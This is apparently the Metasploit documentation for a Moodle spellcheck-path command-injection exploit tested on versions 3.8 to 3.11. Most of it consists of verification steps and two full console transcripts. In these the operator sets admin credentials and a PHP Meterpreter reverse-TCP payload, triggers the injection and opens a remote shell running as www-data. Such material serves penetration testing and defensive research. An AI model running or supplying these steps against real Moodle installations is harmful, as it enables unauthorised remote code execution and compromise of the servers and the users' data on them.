## Vulnerable Application

Moodle allows an authenticated administrator to define spellcheck settings via the web interface.
An administrator can update the aspell path to include a command injection. This is extremely
similar to CVE-2013-3630, just using a different variable.

This module was tested against Moodle version 3.11.2, 3.10.0, and 3.8.0. Based on the
Talos advisory: `2021-04-21 - Vendor updated documentation to suggest best practices after installation`,
it is unclear if Moodle will patch this.  Therefore it is unclear what the upper bounds
is on exploitation.

### Install

Moodle provides a step by step guide to install their software
[here](https://docs.moodle.org/311/en/Step-by-step_Installation_Guide_for_Ubuntu)

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploits/multi/http/moodle_spelling_path_rce`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. You should get a shell.

## Options

### Password

Password of an administrator.

### Username

Username of an administrator. Defaults to `admin`

## Scenarios

### Moodle 3.10.0 on Ubuntu 20.04

```
[*] Processing moodle_spellcheck.rb for ERB directives.
resource (moodle_spellcheck.rb)> use exploits/multi/http/moodle_spelling_path_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
resource (moodle_spellcheck.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (moodle_spellcheck.rb)> set username admin
username => admin
resource (moodle_spellcheck.rb)> set password Adminadmin1!
password => Adminadmin1!
resource (moodle_spellcheck.rb)> set targeturi /moodle-3.10.0/
targeturi => /moodle-3.10.0/
resource (moodle_spellcheck.rb)> set payload payload/php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
resource (moodle_spellcheck.rb)> set proxies http:127.0.0.1:8080
proxies => http:127.0.0.1:8080
resource (moodle_spellcheck.rb)> set ReverseAllowProxy true
ReverseAllowProxy => true
resource (moodle_spellcheck.rb)> set lhost eth0
lhost => eth0
resource (moodle_spellcheck.rb)> exploit
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Exploitable Moodle version 3.10 detected
[*] Authenticating as user: admin
[*] Updating aspell path
[*] Changing spell engine to PSpellShell
[*] Triggering payload
[*] Sending stage (39282 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:56124) at 2021-08-29 10:03:37 -0400
[*] Sleeping 5 seconds before cleanup
[*] Authenticating as user: admin
[*] Removing RCE from settings

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : moodle
OS          : Linux moodle 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

### Moodle 3.11.2 on Ubuntu 20.04

```
resource (moodle_spellcheck.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (moodle_spellcheck.rb)> set username admin
username => admin
resource (moodle_spellcheck.rb)> set password Adminadmin1!
password => Adminadmin1!
resource (moodle_spellcheck.rb)> set targeturi /moodle-3.11.2/
targeturi => /moodle-3.11.2/
resource (moodle_spellcheck.rb)> set payload payload/php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
resource (moodle_spellcheck.rb)> set lhost eth0
lhost => eth0
resource (moodle_spellcheck.rb)> exploit
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Exploitable Moodle version 3.11.2 detected
[*] Authenticating as user: admin
[*] Updating aspell path
[*] Changing spell engine to PSpellShell
[*] Triggering payload
[*] Sending stage (39282 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:56130) at 2021-08-29 10:22:03 -0400
[*] Sleeping 5 seconds before cleanup
[*] Authenticating as user: admin
[*] Removing RCE from settings

meterpreter > sysinfo
Computer    : moodle
OS          : Linux moodle 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
```
